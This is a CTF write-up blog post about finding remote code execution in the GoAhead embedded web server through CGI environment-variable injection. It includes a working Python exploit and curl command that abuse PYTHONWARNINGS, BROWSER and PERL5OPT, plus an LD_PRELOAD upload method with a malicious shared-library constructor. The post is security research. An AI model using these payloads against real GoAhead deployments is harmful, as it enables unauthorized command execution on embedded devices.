---
title: PBCTF 2021 - RCE 0-Day in Goahead Webserver
summary: 
date: "2021-10-12T00:00:00Z"

reading_time: true  # Show estimated reading time?
share: true  # Show social sharing links?
profile: true  # Show author profile?
comments: true  # Show comments?
# Optional header image (relative to `static/img/` folder).
header:
  caption: ""
  image: ""
---

# 2 methods RCE 0-Day in Goahead Webserver: PBCTF 2021

Last weekend I participated with my team Zer0pts in PBCTF 2021 and we got the 5th place, we were really close to secure a spot in the top 3 but an error in Wine while solving a shitty misc challenge prived us from this win :(

However, the CTF had some challenges tagged as **pb2own** that needed us to find a 0-day in order to solve them. I have passed almost all the time focusing on advancement web challenge that aimed to find an RCE in **goahead** webserver.

> GoAhead is the world's most popular, tiny embedded web server. It is compact, secure ``wondering if it's really secure haha`` and simple to use. GoAhead is deployed in hundreds of millions of devices and is ideal for the smallest of embedded devices

We managed to achieve RCE in two methods, one that worked on the challenge and another one that was theoretical and not stable but it’s worth mentioning. So without more introduction let’s jump to the analysis of how we did the code review of this huge C code.

*Note:* the lesson of the day is that whenever you hit a wall just ping @st98 senpai .

### Initial Thoughts:

@st98 senpai firstly mentioned that we have the latest version of goahead running with some simple cgi binary and basic configuration. 
I started by understanding the inner working of goahead server. **[goahead.c]([goahead.c](https://github.com/embedthis/goahead/blob/master/src/goahead.c))** file has the main function where it parses the configuration files and the CLI args but it has nothing important in our case. I jumped then to **http.c** where the main logic of handling the HTTP requests is there. We can see that after parsing the different HTTP headers, it stores all the information in a structure named Webs that is declared in **goahead.h** as follow:
```c
typedef struct Webs {
    WebsBuf         rxbuf;              /**< Raw receive buffer */
    WebsBuf         input;              /**< Receive buffer after de-chunking */
    WebsBuf         output;             /**< Transmit buffer after chunking */
    WebsBuf         chunkbuf;           /**< Pre-chunking data buffer */
    WebsBuf         *txbuf;
    WebsTime        since;              /**< Parsed if-modified-since time */
    WebsTime        timestamp;          /**< Last transaction with browser */
    WebsHash        vars;               /**< CGI standard variables */
    int             timeout;            /**< Timeout handle */
    char            ipaddr[ME_MAX_IP];  /**< Connecting ipaddress */
    char            ifaddr[ME_MAX_IP];  /**< Local interface ipaddress */

    int             rxChunkState;       /**< Rx chunk encoding state */
    ssize           rxChunkSize;        /**< Rx chunk size */
.
.
.
.
    WebsHash        responseCookies;    /**< Outgoing cookies */
    struct WebsSession *session;        /**< Session record */
    struct WebsRoute *route;            /**< Request route */
    struct WebsUser *user;              /**< User auth record */
.
.
. 
#if ME_GOAHEAD_UPLOAD
    int             upfd;               /**< Upload file handle */
    WebsHash        files;              /**< Uploaded files */
    char            *boundary;          /**< Mime boundary (static) */
    ssize           boundaryLen;        /**< Boundary length */
    int             uploadState;        /**< Current file upload state */
    WebsUpload      *currentFile;       /**< Current file context */
    char            *clientFilename;    /**< Current file filename */
    char            *uploadTmp;         /**< Current temp filename for upload data */
    char            *uploadVar;         /**< Current upload form variable name */
#endif
    void            *ssl;               /**< SSL context */
} Webs;
```

Then you can see its initialization here **[L361](https://github.com/embedthis/goahead/blob/master/src/http.c#L361)** which seems logic, along with the other functions it only parses the different elements of the HTTP request.
Honestly I didn't pay close attention on parsing issues since I believed ( my intuition let's say xD) that we will have to abuse or chain something related to CGI binaries execution. However it was worth giving a look at ``websValidateUriPath`` function that calls ``websNormalizeUriPath`` **[L2789](https://github.com/embedthis/goahead/blob/master/src/http.c#L2789)** and see if it has any url decoding issues that can lead for example to a path traversal but afaik and after some trials I didn't see anything suspicious. No double Url encoding or altering paths techniques worked.

### Path traversal on the CGI binary:

The first idea I got was trying to achieve path traversal somewhere in the cgi handler.I started reviewing **[cgi.c](https://github.com/embedthis/goahead/blob/master/src/cgi.c)** file and I noticed that we have full control of the arguments passed to the cgi binary as mentioned in this part of code:
```c
    *argp = cgiPath;
    n = 1;
    query = 0;

    if (strchr(wp->query, '=') == NULL) {
        query = sclone(wp->query);
        websDecodeUrl(query, query, strlen(query));
        for (cp = stok(query, " ", &tok); cp != NULL && argp != NULL; ) {
            *(argp+n) = cp;
            trace(5, "ARG[%d] %s", n, argp[n-1]);
            n++;
            if (n >= argpsize) {
                argpsize *= 2;
                if (argpsize > ME_GOAHEAD_LIMIT_CGI_ARGS) {
                    websError(wp, HTTP_CODE_REQUEST_TOO_LARGE, "Too many arguments");
                    wfree(cgiPath);
                    return 1;
                }
                argp = wrealloc(argp, argpsize * sizeof(char *));
            }
            cp = stok(NULL, " ", &tok);
        }
    }
    *(argp+n) = NULL;
```

Besically if there is no `=` in our query the webserver will url decode again the query, split it by " " and then pass the result as the args array. So the following url ``http://advancement.perfect.blue/cgi-binary/date?aa%20dd`` will result in ``aa`` and ``dd`` passed as arguments.
So if we can somehow run for example /bin/sh instead of the intended cgi binary we can have an easy win and run the following payload for example ``bin/sh -c {command}``. 
Unfortunately after a lot of trials this method wasn't possible because of the following part of code that was sanitizing the CGI filename:
```c 
    getcwd(cwd, ME_GOAHEAD_LIMIT_FILENAME);
    dir = wp->route->dir ? wp->route->dir : cwd;
    chdir(dir);

    extraPath = 0;
    if ((cp = strchr(cgiName, '/')) != NULL) {
        extraPath = sclone(cp);
        *cp = '\0';
        websSetVar(wp, "PATH_INFO", extraPath);
        websSetVarFmt(wp, "PATH_TRANSLATED", "%s%s%s", dir, cgiPrefix, extraPath);
        wfree(extraPath);
    } else {
        websSetVar(wp, "PATH_INFO", "");
        websSetVar(wp, "PATH_TRANSLATED", "");
    }
    cgiPath = sfmt("%s%s/%s", dir, cgiPrefix, cgiName);
    websSetVarFmt(wp, "SCRIPT_NAME", "%s/%s", cgiPrefix, cgiName);
    websSetVar(wp, "SCRIPT_FILENAME", cgiPath);
```

The code is simple, it replaces the first `/` in cgiName with a null byte so the cgiName cannot hold any path traversal payload like ``../../`` since it will be trimmed. I tried a lot of stuffs and manipulations in order to bypass this restriction like using double url encodings but in vain. 
One idea I had faith in, was trying to find some misconsistency in the url decoding logic of the webserver, if we can force another urldecoding operation after passing the check we will have an easy win. After some intense  review of the cgi component and different other components I couldn't achieve it :( I wished that this line was urldecoding the whole path **[L193](https://github.com/embedthis/goahead/blob/master/src/cgi.c#L193)** :'( 

### Abusing Environment variables:

After a lot of trials I gave up on the idea of running another cgi binary and do path traversal and started focusing on how environment variables are handled. This part of code is the most juicy one:

```c=
    envpsize = 64;
    envp = walloc(envpsize * sizeof(char*));
    if (wp->vars) {
        for (n = 0, s = hashFirst(wp->vars); s != NULL; s = hashNext(wp->vars, s)) {
            if (s->content.valid && s->content.type == string) {
                vp = strim(s->name.value.string, " \t\r\n", WEBS_TRIM_BOTH);
                for (bp = envBlackList; *bp; bp++) {
                    if (smatch(vp, *bp)) {
                        continue;
                    }
                }
                if (sstarts(vp, "LD_") || sstarts(vp, "LDR_") || sstarts(vp, "_RLD") || sstarts(vp, "DYLD_") || strstr(vp, "=()")) {
                    continue;
                }
                if (s->arg != 0 && *ME_GOAHEAD_CGI_VAR_PREFIX != '\0') {
                    envp[n++] = sfmt("%s%s=%s", ME_GOAHEAD_CGI_VAR_PREFIX, s->name.value.string,
                        s->content.value.string);
                } else {
                    envp[n++] = sfmt("%s=%s", s->name.value.string, s->content.value.string);
                }
                trace(0, "Env[%d] %s", n, envp[n-1]);
                if (n >= envpsize) {
                    envpsize *= 2;
                    envp = wrealloc(envp, envpsize * sizeof(char *));
                }
            }
        }
    }
    *(envp+n) = NULL;
```

The most trained eye noticed the filter that prohibits using the known LD_* env vars and some other sensible ones. Tl;DR we can only set arbitrary environement variables but with ``CGI_`` prefix. You can also notice that it's setting ``wp->vars`` content as env vars too (wp is Webs structure that is set in **http.c** as we mentioned in the beginning).

Looking at **http.c** file again we can see at **[L1081 ](https://github.com/embedthis/goahead/blob/master/src/http.c#L1081)** how ``wp->vars`` is set:

```c=
        upperKey = sfmt("HTTP_%s", key);
        for (cp = upperKey; *cp; cp++) {
            if (*cp == '-') {
                *cp = '_';
            }
        }
        supper(upperKey);
        if ((prior = websGetVar(wp, upperKey, 0)) != 0) {
            combined = sfmt("%s, %s", prior, value);
            websSetVar(wp, upperKey, combined);
            wfree(combined);
        } else {
            websSetVar(wp, upperKey, value);
        }
        wfree(upperKey);
```

You can notice that any HTTP header we send is added to ``wp->vars`` after concatenating the prefix ``HTTP_`` so we can also set arbitrary environment variables with ``HTTP_`` as a prefix but we can't do a lot of stuffs because of these restrictions.

At this part I didn't know what to do next so I started digging in the code and in other components hoping that I can find something useful until @st98 senpai sent the following in the discord channel of the team:

![DISCORD](https://i.imgur.com/tn0QELk.png)

Honestly we didn't know at first why this happened, but let's take a look at **http.c** file at **[L1404](https://github.com/embedthis/goahead/blob/master/src/http.c#L1404)** . You can see from the code that it's adding form data to ``wp->vars`` without any prior sanitization and as we mentioned ``wp->vars`` was added to the environment variables: 

```c=
static void addFormVars(Webs *wp, char *vars)
{
    WebsKey     *sp;
    cchar       *prior;
    char        *keyword, *value, *tok;

    assert(wp);
    assert(vars);

    keyword = stok(vars, "&", &tok);
    while (keyword != NULL) {
        if ((value = strchr(keyword, '=')) != NULL) {
            *value++ = '\0';
            websDecodeUrl(keyword, keyword, strlen(keyword));
            websDecodeUrl(value, value, strlen(value));
        } else {
            value = "";
        }
        if (*keyword) {
            /*
                If keyword has already been set, append the new value to what has been stored.
             */
            if ((prior = websGetVar(wp, keyword, NULL)) != 0) {
                sp = websSetVarFmt(wp, keyword, "%s %s", prior, value);
            } else {
                sp = websSetVar(wp, keyword, value);
            }
            /* Flag as untrusted keyword by setting arg to 1. This is used by CGI to prefix this keyword */
            sp->arg = 1;
        }
        keyword = stok(NULL, "&", &tok);
    }
}
```

### First method RCE (worked in the challenge):

So now that we are able to set any environment variables, we started digging on how we would  achieve RCE. The first idea we got is to use the known ``LD_PRELOAD `` trick, if we manage to upload our shared library in the server with a known path we will have our win but it won't be that easy so we will talk more in details about this approach in the next section.

After a lot of tries and reflection, @st98 senpai sent this interesting [article](https://www.elttam.com/blog/env/#content), it's talking about achieving RCE while running a python script by using ``PYTHONWARNINGS`` ``BROWSER`` and ``PERL5OPT`` variables. You can find more details about this method in the article mentioned below. So here is our final exploit written by @st98 senpai:

```python=
import socket

#s = socket.create_connection(('localhost', 5000))
s = socket.create_connection(('advancement.chal.perfect.blue', 80))
payload = '''--------------------------58ffd05745ad3119
Content-Disposition: form-data; name="PYTHONWARNINGS"

all:0:antigravity.x:0:0
--------------------------58ffd05745ad3119
Content-Disposition: form-data; name="BROWSER"

perlthanks
--------------------------58ffd05745ad3119
Content-Disposition: form-data; name="PERL5OPT"

-Mbase;print(system("cat".chr(0x20)."/flag"));exit;
--------------------------58ffd05745ad3119--
'''.replace('\n', '\r\n').encode()
#payload = payload.replace(b'FILE', open('nekodesu.so', 'rb').read())
l = len(payload)

body = f'''POST /cgi-bin/date HTTP/1.1
Host: localhost:55555
User-Agent: curl/7.68.0
Accept: */*
Content-Length: {l}
Content-Type: multipart/form-data; boundary=------------------------58ffd05745ad3119

'''.replace('\n', '\r\n').encode() + payload

s.send(body)
print(s.recv(1024).decode())
s.close()
```

 or using curl as follow:
 
 ```sh
 curl -F "PYTHONWARNINGS=all:0:antigravity.x:0:0" -F "BROWSER=perlthanks" -F 'PERL5OPT=-Mbase;print(system("cat".chr(0x20)."/flag"));exit;' http://advancement.chal.perfect.blue
 ```
 
 ### Second Method RCE (Didn't work on the challenge)
 
 As mentioned before, we stick a lot of time trying the ``LD_PRELOAD`` trick, but unfortunately we can see in the challenge docker-compose file that ```    read_only: true``` so forcing an upload will always throw an error since the temporary files created while uploading will be stored in ``/etc/goahead/tmp`` . The ``/tmp`` is writable so at first I thought that we have maybe to find another vulnerability while forging the path of the temporary file but we had no luck.
 
 After the end of the CTF, I didn't give up on this idea and sticked trying it in a normal environment with writable FS. You may be asking now that even if we managed to upload the shared library we will still have to brute force/guess the name of the temporary file ? In fact after some intense code review of the upload component I noticed the following while handling the uploaded file **[L240](https://github.com/embedthis/goahead/blob/master/src/upload.c#L240)**:
 
 ```c=
 wfree(wp->uploadTmp);
  if ((wp->uploadTmp = websTempFile(uploadDir, "tmp")) == 0) {
           websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR,
           "Cannot create upload temp file %s. Check upload temp dir %s", wp->uploadTmp, uploadDir);
           return;
       }
       trace(5, "File upload of: %s stored as %s", wp->clientFilename, wp->uploadTmp);

if ((wp->upfd = open(wp->uploadTmp, O_WRONLY | O_CREAT | O_TRUNC | O_BINARY, 0600)) < 0) {
         websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, "Cannot open upload temp file %s", wp->uploadTmp);
         return;
         }
                
```

The webserver is opening the file so we may abuse the opened file descriptor and for example set the ``LD_PRELOAD=/proc/self/fd/6`` while forcing a file upload of the shared library. We can do it using the following command:

```shell
curl -v -F "data=@payload.so" -F "LD_PRELOAD=/proc/self/fd/6" http://advancement.chal.perfect.blue/cgi-bin/date
```

with `payload.so`  having the following before compiling it:

```c
#include <unistd.h>

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    system("cat /etc/passwd");
}
```

However, this method have some constraints that make it hard to exploit :/ 
**1-** We have to guess the file descriptor number ( We can bruteforce it easily)
**2-** Weirdly goahead had different behaviours that I didn't really understand depending on different environements, it throws an internal server error for an unknown reason sometimes. ( Please if you manage to know why DM me )

### Conclusion:

PBCTF 2021 was really fun and hard, it had some awesome challenges that required finding a 0-day in some products in order to solve them, so it was a highly realistic CTF. Kudos to all my awesome teammates in Zer0pts that have really motivated me to be more dedicated to CTFs and learned a lot from them.
